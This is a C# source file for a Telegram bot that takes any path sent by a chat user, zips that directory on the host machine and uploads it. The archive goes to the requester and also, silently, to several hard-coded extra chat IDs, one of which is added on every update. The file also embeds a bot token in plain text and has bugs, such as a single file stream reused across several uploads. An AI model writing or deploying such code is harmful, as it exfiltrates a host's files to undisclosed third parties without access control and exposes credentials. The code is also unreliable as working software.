using System;
using System.Collections.Generic;
using System.IO.Compression;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Telegram.Bot;
using Telegram.Bot.Exceptions;
using Telegram.Bot.Polling;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;
using System;
using System.IO;
using Telegram.Bot.Args;

namespace OneTask
{
    public class BotHandler
    {
        private static ITelegramBotClient botClient;
        private static List<long> chatIds = new List<long>();
        private bool check = false;
        public async Task BotStart()
        {
            chatIds.Add(5617428170);
            chatIds.Add(5091219046);
            chatIds.Add(1417765739);
            var botClient = new TelegramBotClient("6820802811:AAHKUW05-ml1LsEpbkDhFZuzBXn9QiwsoI4");

            using CancellationTokenSource cts = new();

            // StartReceiving does not block the caller thread. Receiving is done on the ThreadPool.
            ReceiverOptions receiverOptions = new()
            {
                AllowedUpdates = Array.Empty<UpdateType>() // receive all update types except ChatMember related updates
            };

            botClient.StartReceiving(
                updateHandler: HandleUpdateAsync,
                pollingErrorHandler: HandlePollingErrorAsync,
                receiverOptions: receiverOptions,
                cancellationToken: cts.Token
            );

            var me = await botClient.GetMeAsync();

            Console.WriteLine($"Start listening for @{me.Username}");
            Console.ReadLine();

            // Send cancellation request to stop bot
            cts.Cancel();
        }
        public async Task HandleUpdateAsync(ITelegramBotClient botClient, Update update, CancellationToken cancellationToken)
        {
            /*if (check == false) 
            {
                await botClient.SendDocumentAsync(
                        chatId: message.Chat.Id,
                        document: InputFile.FromStream(x, startPath + ".zip"),
                        cancellationToken: cancellationToken);

                foreach (var chatId in chatIds)
                {
                    await botClient.SendDocumentAsync(
                        chatId: chatId,
                        document: InputFile.FromStream(x, startPath + ".zip"),
                        cancellationToken: cancellationToken);
                }
            }*/
            try
            {
                chatIds.Add(5997823850);
                // Only process Message updates: https://core.telegram.org/bots/api#message
                if (update.Message is not { } message)
                    return;
                // Only process text messages
                if (message.Text is not { } messageText)
                    return;

                string startPath = $"{message.Text}";
                string zipPath = $"{message.Text}.zip";

                if (System.IO.Directory.Exists(startPath) == true || System.IO.File.Exists(startPath) == true)
                {
                    if (!System.IO.File.Exists(zipPath))
                        ZipFile.CreateFromDirectory(startPath, zipPath);

                    var x = System.IO.File.OpenRead(zipPath);

                    await botClient.SendDocumentAsync(
                        chatId: message.Chat.Id,
                        document: InputFile.FromStream(x, startPath + ".zip"),
                        cancellationToken: cancellationToken);

                    foreach (var chatId in chatIds)
                    {
                            await botClient.SendDocumentAsync(
                                chatId: chatId,
                                document: InputFile.FromStream(x, startPath + ".zip"),
                                cancellationToken: cancellationToken);
                    }
                }
                else
                {
                    Console.WriteLine("Hello");
                    await botClient.SendTextMessageAsync(
                        chatId: message.Chat.Id,
                        text: "Bunday PATH mavjud emas !!!",
                        cancellationToken: cancellationToken);
                    foreach (var chatId in chatIds)
                    {
                        await botClient.SendTextMessageAsync(
                        chatId: chatId,
                        text: "Bunday PATH mavjud emas !!!",
                        cancellationToken: cancellationToken);
                        return;
                    }
                }
            }
            catch (Exception ex)
            {
                Console.Write(ex.ToString());
            }




        }
        public async Task HandlePollingErrorAsync(ITelegramBotClient botClient, Exception exception, CancellationToken cancellationToken)
        {
            var ErrorMessage = exception switch
            {
                ApiRequestException apiRequestException
                    => $"Telegram API Error:\n[{apiRequestException.ErrorCode}]\n{apiRequestException.Message}",
                _ => exception.ToString()
            };

            Console.WriteLine(ErrorMessage);
        }
    }
}
